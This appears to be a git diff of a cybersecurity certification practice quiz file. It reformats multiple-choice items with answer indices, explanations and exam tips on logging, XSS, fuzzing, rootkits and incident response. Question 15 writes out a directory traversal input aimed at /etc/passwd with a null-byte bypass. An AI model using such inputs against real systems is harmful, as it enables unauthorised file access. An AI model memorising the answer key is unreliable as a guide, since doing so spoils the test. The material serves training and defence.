-},
-{
-"id": 13,
-"question": "What is the primary security purpose of enabling and regularly reviewing 'audit logs' on systems and applications?",
-"options": [
-"To encrypt sensitive data stored on the system to prevent unauthorized access.",
-"To record a chronological sequence of activities and events, providing an audit trail for security investigations, compliance auditing, and troubleshooting.",
-"To automatically back up critical system files and configurations to a secure, offsite location.",
-"To prevent users from accessing sensitive data or performing unauthorized actions."
-],
-"correctAnswerIndex": 1,
-"explanation":
-"Audit logs are not primarily for encryption, backup, or preventing initial access (though they can aid in investigations related to those). Audit logs (also known as audit trails) are records of events and activities that occur on a system, application, or network. They provide a chronological record of who did what, when, and where. This information is essential for:
+`,
+      "examTip": `Ping commands with excessively large packet sizes (-s option) can indicate a ping of death attack or reconnaissance.`
+    },
+    {
+      "id": 13,
+      "question": `What is the primary security purpose of enabling and regularly reviewing 'audit logs' on systems and applications?`,
+      "options": [
+        "To encrypt sensitive data stored on the system to prevent unauthorized access.",
+        "To record a chronological sequence of activities and events, providing an audit trail for security investigations, compliance auditing, and troubleshooting.",
+        "To automatically back up critical system files and configurations to a secure, offsite location.",
+        "To prevent users from accessing sensitive data or performing unauthorized actions."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `Audit logs are not primarily for encryption, backup, or preventing initial access (though they can aid in investigations related to those). Audit logs (also known as audit trails) are records of events and activities that occur on a system, application, or network. They provide a chronological record of who did what, when, and where. This information is essential for:
 * Security Investigations: Tracing the actions of attackers, identifying compromised accounts, determining the scope of a breach, and gathering evidence.
 * Compliance Auditing: Demonstrating adherence to regulatory requirements and internal security policies (e.g., HIPAA, PCI DSS, SOX).
 * Troubleshooting: Diagnosing system problems, identifying the cause of errors, and tracking down configuration changes.
@@ -319,21 +308,20 @@ Configuring appropriate log levels.
 Regularly reviewing and analyzing logs.
 * Protecting logs from unauthorized access and modification.
 
-Storing logs securely and for an appropriate retention period.",
-"examTip": "Audit logs provide a crucial record of system and user activity for security investigations, compliance, and troubleshooting."
-},
-{
-"id": 14,
-"question": "Which of the following is the MOST effective method for preventing 'cross-site scripting (XSS)' attacks in web applications?",
-"options": [
-"Using strong, unique passwords for all user accounts.",
-"Implementing rigorous input validation and context-aware output encoding (or escaping).",
-"Encrypting all network traffic using HTTPS.",
-"Conducting regular penetration testing exercises."
-],
-"correctAnswerIndex": 1,
-"explanation":
-"Strong passwords are important for general security, but don't directly prevent XSS. HTTPS protects data in transit, but not the injection itself (the script can still be injected over HTTPS). Penetration testing helps identify XSS vulnerabilities, but doesn't prevent them. The most effective defense against XSS is a combination of two key techniques:
+Storing logs securely and for an appropriate retention period.`,
+      "examTip": `Audit logs provide a crucial record of system and user activity for security investigations, compliance, and troubleshooting.`
+    },
+    {
+      "id": 14,
+      "question": `Which of the following is the MOST effective method for preventing 'cross-site scripting (XSS)' attacks in web applications?`,
+      "options": [
+        "Using strong, unique passwords for all user accounts.",
+        "Implementing rigorous input validation and context-aware output encoding (or escaping).",
+        "Encrypting all network traffic using HTTPS.",
+        "Conducting regular penetration testing exercises."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `Strong passwords are important for general security, but don't directly prevent XSS. HTTPS protects data in transit, but not the injection itself (the script can still be injected over HTTPS). Penetration testing helps identify XSS vulnerabilities, but doesn't prevent them. The most effective defense against XSS is a combination of two key techniques:
 * Rigorous Input Validation: Thoroughly checking all user-supplied data (from forms, URL parameters, cookies, etc.) to ensure it conforms to expected formats, lengths, and character types, and rejecting or sanitizing any input that contains potentially malicious characters (like <, >, ", ', &). Input validation should be performed on the server-side, as client-side validation can be bypassed.
 * Context-Aware Output Encoding/Escaping: When displaying user-supplied data back to the user (or other users), properly encode or escape special characters based on the output context. This means converting characters that have special meaning in HTML, JavaScript, CSS, or URLs into their corresponding entity equivalents so they are rendered as text and not interpreted as code by the browser. The specific encoding needed depends on where the data is being displayed:
 * HTML Body: Use HTML entity encoding (e.g., < becomes &lt;, > becomes &gt;).
@@ -346,26 +334,24 @@ CSS: Use CSS escaping.
 
 URL: Use URL encoding (percent-encoding).
 
-Simply using HTML encoding everywhere is *not always sufficient*. The context is crucial.",
-Use code with caution.
-"examTip": "Input validation and context-aware output encoding are the primary defenses against XSS; the output context determines the correct encoding method."
-},
-{
-"id": 15,
-"question": "A web application accepts a filename as input from the user and then attempts to read and display the contents of that file. An attacker provides the following input:
+Simply using HTML encoding everywhere is *not always sufficient*. The context is crucial.`,
+      "examTip": `Input validation and context-aware output encoding are the primary defenses against XSS; the output context determines the correct encoding method.`
+    },
+    {
+      "id": 15,
+      "question": `A web application accepts a filename as input from the user and then attempts to read and display the contents of that file. An attacker provides the following input:
 
 Filename: ../../../../etc/passwd%00.jpg
 
-What type of attack is being attempted, what is the significance of the %00, and what might the attacker be trying to achieve?",
-"options":[
-"Cross-site scripting (XSS); %00 is used to inject JavaScript code.",
-"Directory traversal; %00 is a URL-encoded null byte, often used to bypass weak input validation and terminate strings prematurely.",
-"SQL injection; %00 is used to terminate SQL strings.",
-"Denial-of-service (DoS); %00 is used to crash the web server."
-],
-"correctAnswerIndex": 1,
-"explanation":
-This is not XSS (which involves injecting scripts), SQL injection (which targets databases), or DoS (which aims to disrupt service). The input ../../../../etc/passwd%00.jpg is a clear attempt at a directory traversal (also known as path traversal) attack. The attacker is using:
+What type of attack is being attempted, what is the significance of the %00, and what might the attacker be trying to achieve?`,
+      "options": [
+        "Cross-site scripting (XSS); %00 is used to inject JavaScript code.",
+        "Directory traversal; %00 is a URL-encoded null byte, often used to bypass weak input validation and terminate strings prematurely.",
+        "SQL injection; %00 is used to terminate SQL strings.",
+        "Denial-of-service (DoS); %00 is used to crash the web server."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `This is not XSS (which involves injecting scripts), SQL injection (which targets databases), or DoS (which aims to disrupt service). The input ../../../../etc/passwd%00.jpg is a clear attempt at a directory traversal (also known as path traversal) attack. The attacker is using:
 
 ../../../../: This sequence attempts to navigate up the directory structure, outside the intended webroot directory.
 * /etc/passwd: This is the target file the attacker wants to access. On Linux/Unix systems, /etc/passwd contains a list of user accounts (though not passwords in modern systems, it can still reveal valuable information).
@@ -373,21 +359,20 @@ This is not XSS (which involves injecting scripts), SQL injection (which targets
 %00: This is a URL-encoded null byte. Attackers often use null bytes to try to bypass weak input validation or string handling routines in web applications. Some poorly written code might stop processing the input string at the null byte, effectively ignoring the .jpg extension and potentially allowing the attacker to access the intended file (/etc/passwd).
 * .jpg: By adding this to the end, it may help bypass some weak security filters.
 
-The attacker is hoping that the web application will not properly validate or sanitize the filename input, allowing them to traverse the directory structure and access a sensitive system file.",
-"examTip": "Directory traversal attacks use ../ sequences and often null bytes (%00) to try to access files outside the webroot."
-},
-{
-"id": 16,
-"question": "What is 'fuzzing', and why is it an important technique in software security testing?",
-"options": [
-"Fuzzing is a method for encrypting data to protect it from unauthorized access.",
-"Fuzzing is a technique for providing invalid, unexpected, or random data as input to a program to identify vulnerabilities and potential crash conditions.",
-"Fuzzing is a way to generate strong, unique passwords for user accounts.",
-"Fuzzing is a process for manually reviewing source code to find security flaws."
-],
-"correctAnswerIndex": 1,
-"explanation":
-"Fuzzing is not encryption, password generation, or code review (though code review is very important). Fuzzing (or fuzz testing) is a dynamic testing technique used to discover software vulnerabilities and bugs. It involves providing a program or application with invalid, unexpected, malformed, or random data (often called 'fuzz') as input. The fuzzer then monitors the program for:
+The attacker is hoping that the web application will not properly validate or sanitize the filename input, allowing them to traverse the directory structure and access a sensitive system file.`,
+      "examTip": `Directory traversal attacks use ../ sequences and often null bytes (%00) to try to access files outside the webroot.`
+    },
+    {
+      "id": 16,
+      "question": `What is 'fuzzing', and why is it an important technique in software security testing?`,
+      "options": [
+        "Fuzzing is a method for encrypting data to protect it from unauthorized access.",
+        "Fuzzing is a technique for providing invalid, unexpected, or random data as input to a program to identify vulnerabilities and potential crash conditions.",
+        "Fuzzing is a way to generate strong, unique passwords for user accounts.",
+        "Fuzzing is a process for manually reviewing source code to find security flaws."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `Fuzzing is not encryption, password generation, or code review (though code review is very important). Fuzzing (or fuzz testing) is a dynamic testing technique used to discover software vulnerabilities and bugs. It involves providing a program or application with invalid, unexpected, malformed, or random data (often called 'fuzz') as input. The fuzzer then monitors the program for:
 * Crashes
 * Errors
 * Exceptions
@@ -408,21 +393,20 @@ Cross-Site Scripting (XSS)
 
 SQL Injection
 
-Fuzzing is particularly effective at finding vulnerabilities that might be missed by traditional testing methods, which often focus on expected or valid inputs. It can uncover edge cases and unexpected input combinations that trigger bugs.",
-"examTip": "Fuzzing is a dynamic testing technique that finds vulnerabilities by providing unexpected and invalid input to a program."
-},
-{
-"id": 17,
-"question": "You are investigating a suspected compromise of a Windows system. Which of the following Windows Event Log IDs is specifically associated with successful user logon events?",
-"options": [
-"4720",
-"4624",
-"4688",
-"4104"
-],
-"correctAnswerIndex": 1,
-"explanation":
-"Event ID 4720 indicates a user account was created. Event ID 4 688 indicates a new process has been created. Event ID 4104 is for PowerShell script block logging (if enabled). Windows Event ID *4624* specifically indicates that an account was *successfully logged on* to the system. This event log provides details about the logon event, including:
+Fuzzing is particularly effective at finding vulnerabilities that might be missed by traditional testing methods, which often focus on expected or valid inputs. It can uncover edge cases and unexpected input combinations that trigger bugs.`,
+      "examTip": `Fuzzing is a dynamic testing technique that finds vulnerabilities by providing unexpected and invalid input to a program.`
+    },
+    {
+      "id": 17,
+      "question": `You are investigating a suspected compromise of a Windows system. Which of the following Windows Event Log IDs is specifically associated with successful user logon events?`,
+      "options": [
+        "4720",
+        "4624",
+        "4688",
+        "4104"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `Event ID 4720 indicates a user account was created. Event ID 4688 indicates a new process has been created. Event ID 4104 is for PowerShell script block logging (if enabled). Windows Event ID *4624* specifically indicates that an account was *successfully logged on* to the system. This event log provides details about the logon event, including:
       * The user account that logged on.
       * The logon type (e.g., interactive, network, service, batch).
       * The source IP address (if applicable).
@@ -431,70 +415,89 @@ Fuzzing is particularly effective at finding vulnerabilities that might be misse
      *  The logon process.
       *  Authentication package.
 
-   This is a crucial event log for auditing user activity, investigating security incidents, and detecting unauthorized access. A related event ID, 4625, indicates a *failed* logon attempt.",
-    "examTip": "Windows Event ID 4624 indicates a successful user logon; Event ID 4625 indicates a failed logon attempt."
-},
-{
- "id": 18,
-"question": "A security analyst observes a large number of outbound connections from an internal server to multiple external IP addresses on port 443 (HTTPS). While HTTPS traffic is generally considered secure, what further investigation steps are MOST critical to determine if this activity is malicious?",
- "options": [
-     "Assume the traffic is legitimate because it's encrypted and take no further action.",
-    "Identify the process initiating the connections, investigate the destination IP addresses and domains (reputation, WHOIS, threat intelligence), and, if possible and authorized, decrypt and inspect the traffic content.",
-  "Block all outbound traffic on port 443 to prevent further communication.",
-     "Reboot the server to terminate the connections and clear any potential malware."
-     ],
-     "correctAnswerIndex": 1,
- "explanation":
-  "Assuming encrypted traffic is *always* legitimate is a dangerous assumption. Blocking *all* outbound traffic on port 443 would disrupt legitimate HTTPS communication (web browsing, cloud services, etc.). Rebooting terminates connections but doesn't address the root cause and may lose volatile data. While HTTPS *encrypts* the communication (protecting the *confidentiality* of the data in transit), it *doesn't guarantee* that the communication is legitimate or safe. The fact that there are *many* outbound connections to *multiple external IPs* on port 443 is potentially suspicious and warrants further investigation. It *could* be:
+   This is a crucial event log for auditing user activity, investigating security incidents, and detecting unauthorized access. A related event ID, 4625, indicates a *failed* logon attempt.`,
+      "examTip": `Windows Event ID 4624 indicates a successful user logon; Event ID 4625 indicates a failed logon attempt.`
+    },
+    {
+      "id": 18,
+      "question": `A security analyst observes a large number of outbound connections from an internal server to multiple external IP addresses on port 443 (HTTPS). While HTTPS traffic is generally considered secure, what further investigation steps are MOST critical to determine if this activity is malicious?`,
+      "options": [
+        "Assume the traffic is legitimate because it's encrypted and take no further action.",
+        "Identify the process initiating the connections, investigate the destination IP addresses and domains (reputation, WHOIS, threat intelligence), and, if possible and authorized, decrypt and inspect the traffic content.",
+        "Block all outbound traffic on port 443 to prevent further communication.",
+        "Reboot the server to terminate the connections and clear any potential malware."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `Assuming encrypted traffic is *always* legitimate is a dangerous assumption. Blocking *all* outbound traffic on port 443 would disrupt legitimate HTTPS communication (web browsing, cloud services, etc.). Rebooting terminates connections but doesn't address the root cause and may lose volatile data. While HTTPS *encrypts* the communication (protecting the *confidentiality* of the data in transit), it *doesn't guarantee* that the communication is legitimate or safe. The fact that there are *many* outbound connections to *multiple external IPs* on port 443 is potentially suspicious and warrants further investigation. It *could* be:
     *    **Command and Control (C2) Communication:** Malware often uses HTTPS to communicate with C2 servers, as this traffic blends in with normal web browsing.
      *  **Data Exfiltration:** An attacker might be using HTTPS to send stolen data to a remote server.
       *   **Compromised Legitimate Application:** A legitimate application on the server might have been compromised and is being used for malicious purposes.
 
      The *most critical* investigation steps are:
-     1. **Identify the Process:** Determine *which process* on the server is initiating these connections (using tools like `netstat`, `ss`, Resource Monitor, or Process Explorer).
+     1. **Identify the Process:** Determine *which process* on the server is initiating these connections (using tools like \`netstat\`, \`ss\`, Resource Monitor, or Process Explorer).
       2.   **Investigate Destination IPs/Domains:** Research the external IP addresses and domains using:
             *   **Threat intelligence feeds:** Check if the IPs/domains are associated with known malicious activity (botnets, malware distribution, phishing, etc.).
          *    **WHOIS lookups:** Identify the owners of the domains (although this information can be obscured).
         *   **Reputation services:** Check the reputation of the IPs/domains.
            *  **Passive DNS:** See what other domains have resolved to that IP address
    3.  **Analyze Process Behavior:** Examine the process's behavior on the server (file system activity, registry changes, loaded modules, etc.) to understand its purpose and identify any suspicious activity.
-  4.    **Decrypt and Inspect Traffic (If Possible and Authorized):** If legally and technically feasible, *decrypt* the HTTPS traffic (using a man-in-the-middle proxy, SSL/TLS decryption capabilities in a security appliance, or other decryption techniques, *with appropriate authorization and legal compliance*) to examine the *actual content* of the communication. This can provide definitive proof of malicious activity (e.g., data exfiltration, C2 commands).",
- "examTip": "Encrypted traffic (HTTPS) can still be malicious; investigate the destination, the process, and, if possible, decrypt and inspect the content."
-},
-{
-    "id": 19,
-     "question": "You are investigating a Linux server and suspect that a malicious process might be hiding itself from standard process listing tools. Which of the following techniques is the attacker MOST likely using to achieve this?",
- "options": [
-    "Using a descriptive and easily recognizable process name.",
-  "Rootkit techniques, such as hooking system calls, modifying kernel data structures, or using process injection.",
-     "Running the process with low CPU and memory usage.",
-      "Storing the malware executable in a standard system directory (e.g., /bin or /usr/bin)."
-    ],
-   "correctAnswerIndex": 1,
-   "explanation":
- "A descriptive process name would make it *easier* to find. Low resource usage might make it *less noticeable*, but wouldn't *hide* it from process lists. Storing the executable in a standard directory might help it blend in, but wouldn't prevent it from being listed. *Rootkit techniques* are specifically designed to *hide the presence* of malware and attacker activity. Rootkits often achieve this by:
-   *   **Hooking system calls:** Intercepting and modifying the results of system calls (like those used to list processes, open files, or network connections) to hide the malicious process or its activity. For example, a rootkit might hook the `readdir()` system call (used to read directory contents) to prevent the malicious process's files from being listed.
+  4.    **Decrypt and Inspect Traffic (If Possible and Authorized):** If legally and technically feasible, *decrypt* the HTTPS traffic (using a man-in-the-middle proxy, SSL/TLS decryption capabilities in a security appliance, or other decryption techniques, *with appropriate authorization and legal compliance*) to examine the *actual content* of the communication. This can provide definitive proof of malicious activity (e.g., data exfiltration, C2 commands).`,
+      "examTip": `Encrypted traffic (HTTPS) can still be malicious; investigate the destination, the process, and, if possible, decrypt and inspect the content.`
+    },
+    {
+      "id": 19,
+      "question": `You are investigating a Linux server and suspect that a malicious process might be hiding itself from standard process listing tools. Which of the following techniques is the attacker MOST likely using to achieve this?`,
+      "options": [
+        "Using a descriptive and easily recognizable process name.",
+        "Rootkit techniques, such as hooking system calls, modifying kernel data structures, or using process injection.",
+        "Running the process with low CPU and memory usage.",
+        "Storing the malware executable in a standard system directory (e.g., /bin or /usr/bin)."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `A descriptive process name would make it *easier* to find. Low resource usage might make it *less noticeable*, but wouldn't *hide* it from process lists. Storing the executable in a standard directory might help it blend in, but wouldn't prevent it from being listed. *Rootkit techniques* are specifically designed to *hide the presence* of malware and attacker activity. Rootkits often achieve this by:
+   *   **Hooking system calls:** Intercepting and modifying the results of system calls (like those used to list processes, open files, or network connections) to hide the malicious process or its activity. For example, a rootkit might hook the \`readdir()\` system call (used to read directory contents) to prevent the malicious process's files from being listed.
      *   **Modifying kernel data structures:** Directly altering the data structures used by the operating system's kernel to track processes, making the malicious process invisible to standard tools that rely on those structures.
     *  **Process Injection:** Injecting malicious code into a legitimate process.
   * **Using DKOM** Direct Kernel Object Manipulation
 
- Detecting rootkits often requires specialized tools that can analyze the system's kernel and memory, and compare it against a known-good baseline.",
-     "examTip": "Rootkits use advanced techniques to hide malware from standard system tools, often by manipulating the kernel."
-},
-{
-    "id": 20,
-    "question": "What is 'credential stuffing', and why is it a significant security threat?",
-     "options":[
+ Detecting rootkits often requires specialized tools that can analyze the system's kernel and memory, and compare it against a known-good baseline.`,
+      "examTip": `Rootkits use advanced techniques to hide malware from standard system tools, often by manipulating the kernel.`
+    },
+    {
+      "id": 20,
+      "question": `What is 'credential stuffing', and why is it a significant security threat?`,
+      "options": [
         "A type of denial-of-service (DoS) attack that overwhelms a server with login requests.",
         "The automated use of lists of stolen username/password pairs (obtained from previous data breaches) to attempt to gain unauthorized access to other online accounts.",
         "A technique used to bypass multi-factor authentication (MFA).",
-   "A type of phishing attack that targets high-profile individuals within an organization."
-   ],
- "correctAnswerIndex": 1,
-"explanation":
-     "Credential stuffing is not a DoS attack, an MFA bypass technique (though it *can* be used *before* MFA is encountered), or a type of phishing (though phishing *can* be used to *obtain* credentials used in stuffing). *Credential stuffing* is a type of cyberattack where attackers use lists of *stolen username/password pairs* (often obtained from data breaches of *other* websites or services) and *automatically try them* on a *different target website or application*. The attack relies on the common (and insecure) practice of *password reuse* – many users use the same username and password across multiple online accounts. If an attacker obtains credentials from a breach on one site, they can try those same credentials on other popular sites (e.g., email, social media, banking, online shopping), hoping to find a match and gain unauthorized access. This is often done using automated tools that can try thousands or millions of credential combinations quickly.",
-     "examTip": "Credential stuffing exploits password reuse by using stolen credentials from one breach to try to access other accounts."
-},
+        "A type of phishing attack that targets high-profile individuals within an organization."
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": `Credential stuffing is not a DoS attack, an MFA bypass technique (though it *can* be used *before* MFA is encountered), or a type of phishing (though phishing *can* be used to *obtain* credentials used in stuffing). *Credential stuffing* is a type of cyberattack where attackers use lists of *stolen username/password pairs* (often obtained from data breaches of *other* websites or services) and *automatically try them* on a *different target website or application*. The attack relies on the common (and insecure) practice of *password reuse* – many users use the same username and password across multiple online accounts. If an attacker obtains credentials from a breach on one site, they can try those same credentials on other popular sites (e.g., email, social media, banking, online shopping), hoping to find a match and gain unauthorized access. This is often done using automated tools that can try thousands or millions of credential combinations quickly.`,
+      "examTip": `Credential stuffing exploits password reuse by using stolen credentials from one breach to try to access other accounts.`
+    }
+  ]
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 {
  "id": 21,
    "question": "A web application allows users to upload files. What is the MOST CRITICAL security measure to implement to prevent attackers from uploading and executing malicious code?",
@@ -757,6 +760,18 @@ Fuzzing is particularly effective at finding vulnerabilities that might be misse
     BCP is about ensuring the *survival* and *continued operation* of the business, not just protecting IT systems (though IT disaster recovery is a *key component* of BCP).",
   "examTip": "BCP is about ensuring business survival and minimizing downtime during disruptions, not just IT recovery."
 },
+
+
+
+
+
+
+
+
+
+
+
+
 {
      "id": 34,
   "question": "You are investigating a compromised Linux system and suspect that a malicious process is running.  Which command, and associated options, would provide the MOST comprehensive view of running processes, including their process IDs (PIDs), parent process IDs (PPIDs), user, CPU and memory usage, and full command lines?",
@@ -807,6 +822,41 @@ Fuzzing is particularly effective at finding vulnerabilities that might be misse
   These techniques, when combined, provide a robust defense against XSS.",
   "examTip": "Preventing XSS requires rigorous input validation, context-aware output encoding, and a strong Content Security Policy."
 },
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 {
   "id": 51,
  "question": "You are analyzing a suspicious file and want to determine its file type *without* relying on the file extension. Which of the following Linux commands is BEST suited for this task?",
@@ -1180,6 +1230,33 @@ SameSite Cookie Attribute: Setting the SameSite attribute on cookies can help pr
 These techniques, when combined, make it extremely difficult for an attacker to forge requests on behalf of an authenticated user.",
 "examTip": "Anti-CSRF tokens, Origin/Referer header validation, and the SameSite cookie attribute are crucial for preventing CSRF attacks."
 },
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 {
 "id": 67,
 "question": "You are investigating a compromised Linux system. You suspect that an attacker may have modified the /etc/passwd file to add a backdoor user account. Which of the following commands would be MOST useful for quickly comparing the current /etc/passwd file against a known-good copy (e.g., from a backup or a similar , uncompromised system) and highlighting any differences?",
@@ -1397,6 +1474,36 @@ These techniques, when combined, make it extremely difficult for an attacker to 
   7. *Update Router firmware*",
     "examTip": "Unexpected browser redirects are often caused by malware (browser hijackers) or compromised DNS settings; thorough scanning, checking the HOSTS file, and verifying DNS settings are crucial."
 },
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 {
  "id": 75,
  "question": "You are analyzing a suspicious file and want to extract all human-readable strings from it.  Which command is specifically designed for this purpose, and why is this a useful initial step in analyzing potentially malicious files?",
